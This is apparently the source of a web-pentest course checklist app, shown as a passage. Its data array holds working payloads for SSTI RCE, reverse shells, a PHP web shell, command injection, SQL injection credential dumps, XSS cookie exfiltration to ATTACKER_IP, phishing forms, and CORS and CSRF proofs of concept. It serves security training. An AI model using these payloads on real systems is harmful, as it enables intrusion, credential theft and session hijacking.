            code: "# 1. Detection Probes:\n{{7*7}}   ${7*7}   <%= 7*7 %>\n\n# 2. Jinja2 (Python/Flask) RCE:\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n\n# 3. Twig (PHP) RCE:\n{{ ['id']|filter('system') }}\n\n# 4. ERB (Ruby) RCE:\n<%= `id` %>"
          }
        ],
        indicator: "Mathematical expression {{7*7}} evaluates to 49 in the rendered response, followed by command output from id or whoami.",
        syllabusItems: [
          { id: "10.8", title: "Server-Side Template Injection (SSTI) Overview", kind: "Overview" },
          { id: "10.9", title: "Challenge: Server-Side Template Injection (SSTI)", kind: "Challenge" },
          { id: "10.10", title: "Demo: Server-Side Template Injection (SSTI)", kind: "Demo" }
        ]
      },
      {
        id: "10.11",
        ref: "10.11",
        syllabusRefs: ["10.11", "10.12"],
        title: "Escalate RCE / SSTI to an Interactive Reverse Shell",
        type: "server",
        optional: true,
        summary: "Convert blind or one-shot command execution (from SSTI, Command Injection, or File Upload) into an interactive reverse shell. Encoding the payload in Base64 or URL-encoding special characters avoids breaking shell parsing or HTTP parameters.",
        steps: [
          "Check your VPN/tun0 or lab IP address (<code>ip a</code>) and start a Netcat listener on an open port: <code>nc -lvnp 4444</code>.",
          "Verify outbound connectivity or available binaries on the target using your RCE primitive (e.g., <code>which nc bash python3 curl</code>).",
          "Wrap the reverse shell command in Base64 (<code>echo -n 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64</code>) so characters like <code>&</code>, <code>></code>, and spaces don't break the HTTP request or parent shell.",
          "Execute <code>echo <B64> | base64 -d | bash</code> through the SSTI/RCE vulnerability and upgrade the shell with Python PTY."
        ],
        snippets: [
          {
            label: "Listener & Base64-Wrapped Bash Reverse Shell",
            code: "# On attacker machine:\nnc -lvnp 4444\n\n# Safe RCE / SSTI execution payload (replace IP/PORT):\nbash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\n\n# Stabilize received shell:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
          }
        ],
        indicator: "Incoming connection received on your Netcat listener providing an interactive shell as the web server user (e.g., www-data).",
        syllabusItems: [
          { id: "10.11", title: "(Optional) Challenge: Get A Reverse Shell", kind: "Optional" },
          { id: "10.12", title: "Section Quiz (Server-Side Attacks - Part 1)", kind: "Quiz", quizReview: "Verify you can: (1) bypass non-recursive ../ filters in Path Traversal, (2) access loopback/internal services via SSRF, (3) identify template engines with {{7*7}} vs {{7*'7'}}, and (4) deliver a reverse shell via SSTI." }
        ]
      }
    ]
  },
  {
    id: "sec-11",
    num: "11.0",
    title: "Server-Side Attacks - Part 2",
    items: [
      {
        id: "11.1",
        ref: "11.1–11.2",
        syllabusRefs: ["11.1", "11.2"],
        title: "File Upload Vulnerabilities (Web Shell Upload)",
        type: "server",
        summary: "Test file upload endpoints (avatars, attachments, imports) for weak validation on file extensions, Content-Type headers, and magic bytes. Uploading an executable script (.php, .phtml, .jsp, .aspx) into a web-accessible directory achieves direct RCE.",
        steps: [
          "Upload a benign image first while capturing the <code>multipart/form-data</code> request in Burp Proxy, and find the URL where the uploaded file is stored/retrieved (e.g., <code>/uploads/avatar.png</code>).",
          "Send the upload request to Burp Repeater: keep the <code>Content-Type: image/png</code> header and PNG/GIF magic bytes (<code>GIF89a;</code>) at the top of the file, but change <code>filename=\"shell.php\"</code>.",
          "If <code>.php</code> is blacklisted, fuzz alternative executable extensions: <code>.php5</code>, <code>.phtml</code>, <code>.phar</code>, double extensions (<code>shell.jpg.php</code>), case variations (<code>.pHp</code>), or null-byte/path tricks.",
          "Request the uploaded file in your browser or with <code>curl {{TARGET_URL}}/uploads/shell.php?cmd=id</code> to execute commands."
        ],
        snippets: [
          {
            label: "Polyglot GIF/PHP Web Shell Multipart Payload",
            code: "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: image/gif\n\nGIF89a;\n<?php system($_GET['cmd']); ?>"
          }
        ],
        indicator: "Server accepts the executable extension and visiting the uploaded file URL executes code instead of returning static text.",
        syllabusItems: [
          { id: "11.1", title: "File Upload Overview", kind: "Overview" },
          { id: "11.2", title: "Lab: File Upload Vulnerabilities", kind: "Lab" }
        ]
      },
      {
        id: "11.3",
        ref: "11.3–11.4",
        syllabusRefs: ["11.3", "11.4"],
        title: "Chaining File Upload to SSTI",
        type: "server",
        summary: "Even on non-PHP servers (like Python Flask/Django or Node.js) where uploading a .php shell won't execute, uploaded files may be parsed and rendered by the application's template engine or loaded via a path traversal include.",
        steps: [
          "Identify how the application uses the uploaded file: does it render the uploaded HTML/template/markdown content back to the user, or allow selecting a template filename?",
          "Create a file containing a template expression such as <code>{{7*7}}</code> (and a Jinja2 RCE payload) with the allowed extension (e.g., <code>.html</code>, <code>.tpl</code>, <code>.txt</code>, or <code>.md</code>).",
          "Upload the file and navigate to the page or preview route that renders the uploaded file.",
          "Check if the template engine evaluates <code>{{7*7}}</code> into <code>49</code> and executes your OS command payload."
        ],
        snippets: [
          {
            label: "Malicious Template File for Upload-to-SSTI",
            code: "<!-- Save as template.html or profile.tpl and upload -->\n<p>Check: {{ 7*7 }}</p>\n<pre>{{ cycler.__init__.__globals__.os.popen('id').read() }}</pre>"
          }
        ],
        indicator: "Viewing or rendering the uploaded file evaluates template expressions on the server and returns command output.",
        syllabusItems: [
          { id: "11.3", title: "Challenge: File Upload to SSTI", kind: "Challenge" },
          { id: "11.4", title: "Demo: File Upload to SSTI", kind: "Demo" }
        ]
      },
      {
        id: "11.5",
        ref: "11.5–11.7",
        syllabusRefs: ["11.5", "11.6", "11.7"],
        title: "OS Command Injection",
        type: "server",
        summary: "Test features that invoke system utilities under the hood (such as ping tools, DNS lookups, PDF converters, or archive extractors). Appending shell metacharacters allows chaining arbitrary OS commands onto the intended command.",
        steps: [
          "Find parameters that appear to pass arguments to system binaries (e.g., <code>ip=127.0.0.1</code>, <code>domain=</code>, <code>file=</code>).",
          "In Burp Repeater, append shell command separators one by one: <code>; id</code>, <code>| id</code>, <code>|| id</code>, <code>&& id</code>, <code>& id</code>, newline <code>%0aid</code>, or inline subshells <code>$(id)</code> and <code>`id`</code>.",
          "If output is not reflected (blind command injection), test with a time delay (<code>; sleep 5 #</code> or <code>| ping -c 5 127.0.0.1</code>) or an out-of-band request to your listener (<code>; curl http://ATTACKER_IP:8000/$(whoami)</code>).",
          "If spaces or slashes are filtered, use <code>${IFS}</code> for spaces and Base64 encoding for the payload."
        ],
        snippets: [
          {
            label: "Command Injection Separators & Blind Probes",
            code: "127.0.0.1; id\n127.0.0.1 && whoami\n127.0.0.1 | cat /etc/passwd\n127.0.0.1 `sleep 5`\n127.0.0.1; export R=\"$(id)\"; curl http://ATTACKER_IP:8000/?d=$R"
          }
        ],
        indicator: "Response includes output of id/whoami/cat, or delays by the exact number of seconds specified in a sleep payload.",
        syllabusItems: [
          { id: "11.5", title: "OS Command Injection Overview", kind: "Overview" },
          { id: "11.6", title: "Challenge: OS Command Injection", kind: "Challenge" },
          { id: "11.7", title: "Demo: OS Command Injection", kind: "Demo" }
        ]
      },
      {
        id: "11.8",
        ref: "11.8–11.11",
        syllabusRefs: ["11.8", "11.9", "11.10", "11.11"],
        title: "SQL Injection (Manual Detection & UNION Exploitation)",
        type: "server",
        summary: "Test query parameters, search bars, sorting filters, and POST fields for database query manipulation. Use single/double quotes and boolean conditions to confirm injection, then use UNION SELECT to extract schema and credentials from other tables.",
        steps: [
          "Inject a single quote <code>'</code> or double quote <code>\"</code> into parameters and observe for SQL syntax errors (MySQL, PostgreSQL, SQLite, MSSQL) or missing results; verify that repairing the query with <code>' OR '1'='1</code> or <code>'-- -</code> restores normal output.",
          "Determine the number of columns in the current query using <code>' ORDER BY 1-- -</code>, incrementing the number until the page errors out, or using <code>' UNION SELECT NULL,NULL,NULL-- -</code>.",
          "Identify which column numbers are rendered on the page by replacing <code>NULL</code> with strings/numbers: <code>' UNION SELECT 1,'test',3-- -</code>.",
          "Query database metadata from a visible column: extract <code>database()</code> / <code>@@version</code>, list tables from <code>information_schema.tables</code> (or <code>sqlite_master</code>), list columns from <code>information_schema.columns</code>, and dump the <code>users</code> table."
        ],
        snippets: [
          {
            label: "Manual UNION SQLi Methodology (MySQL / MariaDB / Postgres)",
            code: "# 1. Find column count:\n' ORDER BY 1-- -\n' UNION SELECT 1,2,3,4-- -\n\n# 2. Enumerate databases & tables:\n' UNION SELECT 1,database(),version(),4-- -\n' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -\n\n# 3. Enumerate columns & dump users:\n' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -\n' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users-- -"
          }
        ],
        indicator: "SQL syntax error or boolean behavior difference on quote injection, followed by database version and user credentials rendered via UNION SELECT.",
        syllabusItems: [
          { id: "11.8", title: "Lab: SQL Basics", kind: "Lab" },
          { id: "11.9", title: "SQL Injection Overview", kind: "Overview" },
          { id: "11.10", title: "Challenge: SQL Injection (Manual)", kind: "Challenge" },
          { id: "11.11", title: "Demo: SQL Injection (Manual)", kind: "Demo" }
        ]
      },
      {
        id: "11.12",
        ref: "11.12–11.13",
        syllabusRefs: ["11.12", "11.13"],
        title: "SQL Injection (Automated with SQLMap)",
        type: "server",
        summary: "When an injection point is blind (boolean-based or time-based) or involves complex POST/cookie parameters, save the raw HTTP request from Burp Suite and use SQLMap to enumerate and dump the database.",
        steps: [
          "Capture the vulnerable request in Burp Proxy or Repeater, right-click -> <code>Copy to file</code>, and save it as <code>req.txt</code>.",
          "Run SQLMap pointing to the saved request file and specify the parameter to test with <code>-p <param></code> (or place a <code>*</code> marker at the exact injection point in <code>req.txt</code>).",
          "Enumerate available databases with <code>--dbs</code>, then list tables for the target database with <code>-D <db_name> --tables</code>.",
          "Dump the target table contents (such as <code>users</code> or <code>flags</code>) using <code>-D <db_name> -T <table> --dump</code>."
        ],
        snippets: [
          {
            label: "SQLMap Workflow from Saved Burp Request",
            code: "# 1. Identify vulnerability and list databases:\nsqlmap -r req.txt --batch --dbs\n\n# 2. List tables in target database:\nsqlmap -r req.txt --batch -D <DB_NAME> --tables\n\n# 3. Dump specific table:\nsqlmap -r req.txt --batch -D <DB_NAME> -T users --dump"
          }
        ],
        indicator: "SQLMap confirms injectable parameter (boolean-based, error-based, time-based, or UNION) and dumps database tables.",
        syllabusItems: [
          { id: "11.12", title: "Challenge: SQL Injection (SQLMap)", kind: "Challenge" },
          { id: "11.13", title: "Demo: SQL Injection (SQLMap)", kind: "Demo" }
        ]
      },
      {
        id: "11.14",
        ref: "11.14–11.15",
        syllabusRefs: ["11.14", "11.15", "11.16"],
        title: "Authentication Bypass with SQL Injection",
        type: "server",
        summary: "Test login forms for SQL injection to bypass password verification altogether. Injecting a comment after a valid username or injecting a tautology (OR 1=1) causes the SQL query to return a user row without knowing the password.",
        steps: [
          "Understand the typical backend query: <code>SELECT * FROM users WHERE username = '$user' AND password = '$password'</code>.",
          "In the username field, enter <code>admin' OR 1=1-- -</code> (note the trailing space after <code>--</code> for MySQL) or <code>' OR '1'='1</code> with any random password.",
          "To log in as a specific user without relying on row order, enter <code>admin'-- -</code> or <code>admin'#</code> in the username field so the <code>AND password = '...'</code> check is commented out.",
          "If login fails when <code>OR 1=1</code> returns multiple rows, append <code>LIMIT 1-- -</code>: <code>' OR 1=1 LIMIT 1-- -</code>."
        ],
        snippets: [
          {
            label: "SQLi Auth Bypass Login Payloads",
            code: "admin'-- -\nadmin'#\n' OR 1=1-- -\n' OR 1=1 LIMIT 1-- -\nadmin' OR '1'='1'-- -"
          }
        ],
        indicator: "Login succeeds and issues an authenticated session (often as the first table user or admin) without a valid password.",
        syllabusItems: [
          { id: "11.14", title: "Challenge: Auth Bypass with SQL Injection", kind: "Challenge" },
          { id: "11.15", title: "Demo: Auth Bypass with SQL Injection", kind: "Demo" },
          { id: "11.16", title: "Section Quiz (Server-Side Attacks - Part 2)", kind: "Quiz", quizReview: "Verify you can: (1) bypass file upload MIME/extension checks, (2) chain file uploads with SSTI, (3) test blind and in-band OS command injection, and (4) exploit SQLi manually, with SQLMap, and for auth bypass." }
        ]
      }
    ]
  },
  {
    id: "sec-12",
    num: "12.0",
    title: "Client-Side Attacks - Part 1",
    items: [
      {
        id: "12.1",
        ref: "12.1–12.4",
        syllabusRefs: ["12.1", "12.2", "12.3", "12.4"],
        title: "HTML Injection",
        type: "client",
        summary: "Check where user-supplied input is rendered in the page HTML without entity encoding (< and > left raw). Even if Content Security Policy or script filters block JavaScript, injecting raw HTML allows page defacement, phishing forms, and credential harvesting.",
        steps: [
          "Submit a unique alphanumeric canary with harmless HTML tags like <code><h1>test123</h1></code> or <code><u>probe</u></code> in search boxes, profile fields, and comments.",
          "Right-click the rendered output in the browser -> Inspect Element (or View Page Source) to check whether <code>&lt;h1&gt;</code> was HTML-encoded or parsed as an actual DOM element.",
          "If raw HTML renders, test injecting external images, fake login forms (<code>&lt;form action=\"http://ATTACKER_IP/steal\"&gt;</code>), or base tags.",
          "Use HTML injection findings as a stepping stone to test whether JavaScript event handlers or <code>&lt;script&gt;</code> tags also execute."
        ],
        snippets: [
          {
            label: "HTML Injection Probe & Phishing Form PoC",
            code: "<!-- Basic Detection Probe -->\n<h1>HTMLi_Test</h1>\n\n<!-- Credential Harvesting Form Injection -->\n<div style=\"border:1px solid #ccc;padding:12px\">\n  <h3>Session Expired - Please Re-authenticate</h3>\n  <form action=\"http://ATTACKER_IP:8000/collect\" method=\"POST\">\n    <input name=\"user\" placeholder=\"Username\"><input name=\"pass\" type=\"password\" placeholder=\"Password\">\n    <button type=\"submit\">Login</button>\n  </form>\n</div>"
          }
        ],
        indicator: "Browser renders injected HTML tags as live DOM elements instead of displaying escaped literal text.",
        syllabusItems: [
          { id: "12.1", title: "Intro to Client-Side Attacks", kind: "Overview" },
          { id: "12.2", title: "HTML Injection Overview", kind: "Overview" },
          { id: "12.3", title: "Challenge: HTML Injection", kind: "Challenge" },
          { id: "12.4", title: "Demo: HTML Injection", kind: "Demo" }
        ]
      },
      {
        id: "12.5",
        ref: "12.5–12.7",
        syllabusRefs: ["12.5", "12.6", "12.7"],
        title: "Reflected Cross-Site Scripting (XSS)",
        type: "client",
        summary: "Test URL parameters, search queries, and error messages that immediately reflect user input in the HTTP response. Tailor your payload to the exact injection context—HTML body, HTML attribute, or inside an existing JavaScript block.",
        steps: [
          "Inject a probe string containing special characters like <code>canary\"'<></code> into every URL parameter and form field, then view the raw HTML source (<code>Ctrl+U</code>) to locate every place <code>canary</code> appears.",
          "Determine the context: if inside normal HTML tags, test <code>&lt;script&gt;alert(origin)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(origin)&gt;</code>.",
          "If reflected inside an HTML attribute (e.g., <code>value=\"canary\"</code>), break out of the quote first: <code>\" autofocus onfocus=\"alert(origin)</code> or <code>\"&gt;&lt;svg onload=alert(origin)&gt;</code>.",
          "If reflected inside a <code>&lt;script&gt;</code> string variable (e.g., <code>var q = 'canary';</code>), break out of the JS string: <code>';alert(origin);//</code> or close the tag first with <code>&lt;/script&gt;&lt;script&gt;alert(origin)&lt;/script&gt;</code>."
        ],
        snippets: [
          {
            label: "Context-Specific Reflected XSS Payloads",
            code: "<!-- 1. HTML Body Context -->\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(document.domain)>\n<svg/onload=alert(document.domain)>\n\n<!-- 2. HTML Attribute Breakout (value=\"INPUT\") -->\n\" onfocus=\"alert(document.domain)\" autofocus=\"\n\"><script>alert(document.domain)</script>\n\n<!-- 3. JavaScript String Context (var x = 'INPUT';) -->\n';alert(document.domain);//\n</script><script>alert(document.domain)</script>"
          }
        ],
        indicator: "JavaScript executes in the browser context of the target origin when visiting the crafted link.",
        syllabusItems: [
          { id: "12.5", title: "Cross-Site Scripting (XSS) Overview", kind: "Overview" },
          { id: "12.6", title: "Challenge: Reflected XSS", kind: "Challenge" },
          { id: "12.7", title: "Demo: Reflected XSS", kind: "Demo" }
        ]
      },
      {
        id: "12.8",
        ref: "12.8–12.9",
        syllabusRefs: ["12.8", "12.9"],
        title: "Stored Cross-Site Scripting (XSS)",
        type: "client",
        summary: "Inject JavaScript payloads into persistent data fields (comments, user bios, chat messages, support tickets, or file names) that are saved in the database and later rendered to other users or administrators.",
        steps: [
          "Identify all inputs stored by the server and displayed to other users or in admin dashboards (e.g., blog comments, display names, feedback forms, or even HTTP <code>User-Agent</code> / <code>Referer</code> headers logged for admins).",
          "Test rendering with standard and event-handler payloads (<code>&lt;img src=x onerror=alert(1)&gt;</code>); if the page truncates input length in the HTML form, intercept the POST in Burp to bypass client-side <code>maxlength</code>.",
          "To prove impact or steal a victim/admin session (when <code>HttpOnly</code> is not set) or exfiltrate page data, start an HTTP listener and inject a <code>fetch()</code> callback payload.",
          "Alternatively, have the Stored XSS payload perform an authenticated action as the victim (such as changing their email or creating an admin user)."
        ],
        snippets: [
          {
            label: "Stored XSS Cookie & DOM Exfiltration Payloads",
            code: "<!-- Exfiltrate non-HttpOnly cookies to listener -->\n<script>fetch('http://ATTACKER_IP:8000/?c='+btoa(document.cookie))</script>\n\n<!-- Image onerror variant -->\n<img src=x onerror=\"fetch('http://ATTACKER_IP:8000/?c='+encodeURIComponent(document.cookie))\">"
          }
        ],
        indicator: "Payload persists in the database and executes automatically whenever a user or admin views the affected page.",
        syllabusItems: [
          { id: "12.8", title: "Challenge: Stored XSS", kind: "Challenge" },
          { id: "12.9", title: "Demo: Stored XSS", kind: "Demo" }
        ]
      },
      {
        id: "12.10",
        ref: "12.10–12.12",
        syllabusRefs: ["12.10", "12.11", "12.12", "12.13"],
        title: "Open Redirect",
        type: "client",
        summary: "Test parameters that control post-login or post-action navigation (e.g., ?redirect=, ?next=, ?returnUrl=, ?continue=). An unvalidated redirect allows attackers to send users from a trusted domain to an external phishing or exploit site, or bypass SSRF/OAuth checks.",
        steps: [
          "Filter Burp HTTP History for 301/302 responses or search for parameter names like <code>redirect</code>, <code>url</code>, <code>next</code>, <code>return</code>, <code>dest</code>, or <code>goto</code>.",
          "Replace the parameter value with an external domain (<code>https://example.com</code>) and check if the response returns <code>Location: https://example.com</code> (or redirects via client-side <code>window.location</code>).",
          "If the server blocks <code>http://</code> or checks that the URL starts with or contains the target host, test filter bypasses: protocol-relative <code>//example.com</code>, <code>///example.com</code>, <code>https:example.com</code>, <code>https://{{TARGET_HOST}}.example.com</code>, or <code>https://{{TARGET_HOST}}@example.com</code>.",
          "Also test <code>javascript:alert(document.domain)</code> in redirect parameters that are passed to <code>window.location</code> or <code>href</code> attributes."
        ],
        snippets: [
          {
            label: "Open Redirect Filter Bypass Payloads",
            code: "{{TARGET_URL}}/login?redirect=https://example.com\n{{TARGET_URL}}/login?redirect=//example.com\n{{TARGET_URL}}/login?redirect=/\\example.com\n{{TARGET_URL}}/login?redirect=https://{{TARGET_HOST}}@example.com\n{{TARGET_URL}}/login?redirect=https://{{TARGET_HOST}}.example.com"
          }
        ],
        indicator: "3xx Location header or JavaScript navigation redirects the browser to an attacker-controlled external origin.",
        syllabusItems: [
          { id: "12.10", title: "Open Redirect Overview", kind: "Overview" },
          { id: "12.11", title: "Challenge: Open Redirect", kind: "Challenge" },
          { id: "12.12", title: "Demo: Open Redirect", kind: "Demo" },
          { id: "12.13", title: "Section Quiz (Client-Side Attacks - Part 1)", kind: "Quiz", quizReview: "Verify you can: (1) distinguish HTML Injection from XSS, (2) craft Reflected vs. Stored XSS payloads across HTML/attribute/JS contexts, (3) exfiltrate data via Stored XSS, and (4) identify and bypass Open Redirect filters." }
        ]
      }
    ]
  },
  {
    id: "sec-13",
    num: "13.0",
    title: "Client-Side Attacks - Part 2",
    items: [
      {
        id: "13.1",
        ref: "13.1–13.3",
        syllabusRefs: ["13.1", "13.2", "13.3"],
        title: "Cross-Site Request Forgery (CSRF)",
        type: "client",
        summary: "Check whether state-changing requests (email/password updates, fund transfers, role changes) rely solely on automatically attached session cookies without an unpredictable anti-CSRF token. If unprotected, an external page can silently submit the action on behalf of a logged-in victim.",
        steps: [
          "Capture a state-changing request (e.g., <code>POST /profile/email</code>) in Burp Proxy and check three conditions: (1) uses session cookies for auth, (2) has no unpredictable CSRF token/custom header, and (3) parameters are predictable.",
          "If a <code>csrf_token</code> parameter is present, test removing the parameter entirely, sending an empty value, using a token from your own account, or switching the request method from <code>POST</code> to <code>GET</code> in Burp Repeater.",
          "Check the session cookie's <code>SameSite</code> attribute (<code>SameSite=None</code> or missing/Lax with GET state-changes are vulnerable).",
          "Build a standalone HTML file containing a hidden <code>&lt;form&gt;</code> targeting the vulnerable endpoint that auto-submits via <code>document.forms[0].submit()</code>."
        ],
        snippets: [
          {
            label: "Auto-Submitting CSRF Proof-of-Concept HTML",
            code: "<!DOCTYPE html>\n<html>\n<body>\n  <form id=\"csrf\" action=\"{{TARGET_URL}}/profile/email\" method=\"POST\">\n    <input type=\"hidden\" name=\"email\" value=\"pwned@attacker.local\" />\n  </form>\n  <script>document.getElementById('csrf').submit();</script>\n</body>\n</html>"
          }
        ],
        indicator: "State-changing request succeeds without a validated CSRF token when triggered cross-origin from an external HTML page.",
        syllabusItems: [
          { id: "13.1", title: "Cross-Site Request Forgery (CSRF) Overview", kind: "Overview" },
          { id: "13.2", title: "Challenge: Cross-Site Request Forgery (CSRF)", kind: "Challenge" },
          { id: "13.3", title: "Demo: Cross-Site Request Forgery (CSRF)", kind: "Demo" }
        ]
      },
      {
        id: "13.4",
        ref: "13.4–13.6",
        syllabusRefs: ["13.4", "13.5", "13.6"],
        title: "Clickjacking (UI Redressing)",
        type: "client",
        summary: "Verify whether sensitive pages can be framed inside an external website's <iframe>. When anti-framing headers are absent, an attacker can overlay a transparent iframe of the target application over a decoy button so the victim unwittingly clicks a sensitive action.",
        steps: [
          "Inspect HTTP response headers on sensitive authenticated pages in Burp Proxy.",
          "Check for the presence of <code>X-Frame-Options</code> (<code>DENY</code> or <code>SAMEORIGIN</code>) and <code>Content-Security-Policy: frame-ancestors 'none'</code> (or <code>'self'</code>).",
          "If both headers are missing (or misconfigured), create a local HTML test file that embeds <code>{{TARGET_URL}}</code> inside an <code>&lt;iframe&gt;</code>.",
          "Position a decoy button directly beneath the target action button in the semi-transparent iframe (<code>opacity: 0.0001</code>) to verify the click lands on the framed page."
        ],
        snippets: [
          {
            label: "Clickjacking Iframe Overlay PoC",
            code: "<!DOCTYPE html>\n<html>\n<head>\n<style>\n  iframe { position:relative; width:800px; height:600px; opacity:0.3; z-index:2; border:none; }\n  .decoy { position:absolute; top:320px; left:180px; z-index:1; padding:10px 20px; }\n</style>\n</head>\n<body>\n  <button class=\"decoy\">Click to Claim Reward</button>\n  <iframe src=\"{{TARGET_URL}}/account/delete\"></iframe>\n</body>\n</html>"
          }
        ],
        indicator: "Target page loads cleanly inside a cross-origin <iframe> without being blocked by X-Frame-Options or CSP frame-ancestors.",
        syllabusItems: [
          { id: "13.4", title: "Clickjacking Overview", kind: "Overview" },
          { id: "13.5", title: "Challenge: Clickjacking", kind: "Challenge" },
          { id: "13.6", title: "Demo: Clickjacking", kind: "Demo" }
        ]
      },
      {
        id: "13.7",
        ref: "13.7–13.9",
        syllabusRefs: ["13.7", "13.8", "13.9", "13.10"],
        title: "CORS Misconfigurations",
        type: "client",
        summary: "Test whether authenticated API endpoints dynamically trust arbitrary Origins while setting Access-Control-Allow-Credentials: true. This weakens the Same-Origin Policy and allows an external site to read sensitive authenticated responses via JavaScript fetch/XHR.",
        steps: [
          "Send an authenticated API request (e.g., <code>GET /api/profile</code> or <code>GET /api/apikey</code>) to Burp Repeater and add an <code>Origin: https://evil.com</code> request header.",
          "Inspect the response headers for <code>Access-Control-Allow-Origin: https://evil.com</code> paired with <code>Access-Control-Allow-Credentials: true</code>.",
          "If arbitrary origins are rejected, test common regex misconfigurations: prefix matching (<code>Origin: https://{{TARGET_HOST}}.evil.com</code>), suffix matching (<code>Origin: https://evil{{TARGET_HOST}}</code>), subdomain trust, or <code>Origin: null</code>.",
          "Confirm exploitability with a cross-origin JavaScript PoC using <code>fetch(url, {credentials: 'include'})</code> (or a sandboxed iframe for <code>Origin: null</code>) that exfiltrates the response body."
        ],
        snippets: [
          {
            label: "CORS Origin Probes & Credentialed Fetch Exploit PoC",
            code: "# 1. Test Origin Headers in Burp Repeater:\nOrigin: https://attacker.com\nOrigin: https://{{TARGET_HOST}}.attacker.com\nOrigin: null\n\n# 2. Exploit Script (Hosted on Attacker Origin):\n<script>\nfetch('{{TARGET_URL}}/api/user', { credentials: 'include' })\n  .then(r => r.text())\n  .then(data => fetch('http://ATTACKER_IP:8000/log?d=' + btoa(data)));\n</script>"
          }
        ],
        indicator: "Response reflects your supplied Origin (or null) in Access-Control-Allow-Origin alongside Access-Control-Allow-Credentials: true on a sensitive endpoint.",
        syllabusItems: [
          { id: "13.7", title: "CORS Misconfigurations Overview", kind: "Overview" },
          { id: "13.8", title: "Challenge: CORS Misconfigurations", kind: "Challenge" },
          { id: "13.9", title: "Demo: CORS Misconfigurations", kind: "Demo" },
          { id: "13.10", title: "Section Quiz (Client-Side Attacks - Part 2)", kind: "Quiz", quizReview: "Verify you can: (1) explain why CSRF works and how SameSite/anti-CSRF tokens mitigate it, (2) verify X-Frame-Options and CSP frame-ancestors for Clickjacking, and (3) exploit reflected Origin + Allow-Credentials in CORS." }
        ]
      }
    ]
  }
];

const STORAGE_KEY = "fwap_checklist_state_v1";

const defaultState = {
  viewMode: "pentest", // "pentest" (consolidated 30 checks) or "syllabus" (all 65 course items)
  statusFilter: "all", // "all" | "todo" | "done" | "flagged"
  searchQuery: "",
  targetUrl: "http://target.local",
  theme: "light",
  checked: {},
  flagged: {},
  notes: {},
  openItems: {}
};

let state = loadState();

function loadState() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return { ...defaultState };
    return { ...defaultState, ...JSON.parse(raw) };
  } catch (e) {
    return { ...defaultState };
  }
}

function saveState() {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
  } catch (e) {
    // ignore storage errors
  }
}

function getTargetUrl() {
  const raw = (state.targetUrl || "").trim() || "http://target.local";
  return raw.replace(/\/+$/, "");
}

function getTargetHost() {
  const url = getTargetUrl();
  try {
    const parsed = new URL(url.includes("://") ? url : "http://" + url);
    return parsed.host;
  } catch (e) {
    return url.replace(/^https?:\/\//, "").split("/")[0] || "target.local";
  }
}

function interpolateTarget(text) {
  return text
    .replace(/\{\{TARGET_URL\}\}/g, getTargetUrl())
    .replace(/\{\{TARGET_HOST\}\}/g, getTargetHost());
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

/**
 * Generates normalized display items for each category based on current viewMode:
 * - "pentest": 30 consolidated, non-redundant actionable security checks covering every topic.
 * - "syllabus": All 65 verbatim numbered syllabus items (6.1 - 13.10) from the course, each with full expandable steps.
 */
function getActiveCategories() {
  if (state.viewMode === "pentest") {
    return COURSE_DATA.map(cat => ({
      id: cat.id,
      num: cat.num,
      title: cat.title,
      items: cat.items.map(item => ({
        key: "p_" + item.id,
        ref: item.ref,
        title: item.title,
        badge: item.type.toUpperCase(),
        badgeClass: "",
        optional: !!item.optional,
        summary: item.summary,
        steps: item.steps,
        snippets: item.snippets,
        indicator: item.indicator
      }))
    }));
  }

  // Full Course Syllabus Mode (all 65 items 6.1 through 13.10)
  return COURSE_DATA.map(cat => {
    const expanded = [];
    cat.items.forEach(parent => {
      parent.syllabusItems.forEach(sItem => {
        if (sItem.kind === "Quiz") {
          expanded.push({
            key: "s_" + sItem.id,
            ref: sItem.id,
            title: sItem.title,
            badge: "QUIZ",
            badgeClass: "",
            optional: false,
            summary: sItem.quizReview,
            steps: [
              "Review each lab, challenge, and demo completed in section " + cat.num + " (" + cat.title + ").",
              sItem.quizReview,
              "Ensure any flagged items or notes from this module are documented before advancing."
            ],
            snippets: [],
            indicator: "All core concepts and attack workflows in " + cat.num + " can be explained and reproduced without hints."
          });
        } else {
          let badgeClass = "";
          if (sItem.kind === "Challenge") badgeClass = "badge-type-challenge";
          if (sItem.kind === "Lab") badgeClass = "badge-type-lab";
          expanded.push({
            key: "s_" + sItem.id,
            ref: sItem.id,
            title: sItem.title,
            badge: sItem.kind.toUpperCase(),
            badgeClass,
            optional: sItem.kind === "Optional",
            summary: parent.summary,
            steps: parent.steps,
            snippets: parent.snippets,
            indicator: parent.indicator
          });
        }
      });
    });
    return {
      id: cat.id,
      num: cat.num,
      title: cat.title,
      items: expanded
    };
  });
}

function matchesFilters(item) {
  const isDone = !!state.checked[item.key];
  const isFlagged = !!state.flagged[item.key];

  if (state.statusFilter === "todo" && isDone) return false;
  if (state.statusFilter === "done" && !isDone) return false;
  if (state.statusFilter === "flagged" && !isFlagged) return false;

  const q = state.searchQuery.trim().toLowerCase();
  if (!q) return true;

  const haystack = [
    item.ref,
    item.title,
    item.summary,
    item.indicator,
    ...(item.steps || []),
    ...(item.snippets || []).map(s => s.code + " " + s.label),
    state.notes[item.key] || ""
  ]
    .join(" ")
    .toLowerCase();

  return haystack.includes(q);
}

function renderSidebar(categories) {
  let totalItems = 0;
  let totalDone = 0;
  let totalFlagged = 0;

  const navList = document.getElementById("sidebar-nav");
  navList.innerHTML = "";

  categories.forEach(cat => {
    const catTotal = cat.items.length;
    const catDone = cat.items.filter(i => !!state.checked[i.key]).length;
    const catFlagged = cat.items.filter(i => !!state.flagged[i.key]).length;

    totalItems += catTotal;
    totalDone += catDone;
    totalFlagged += catFlagged;

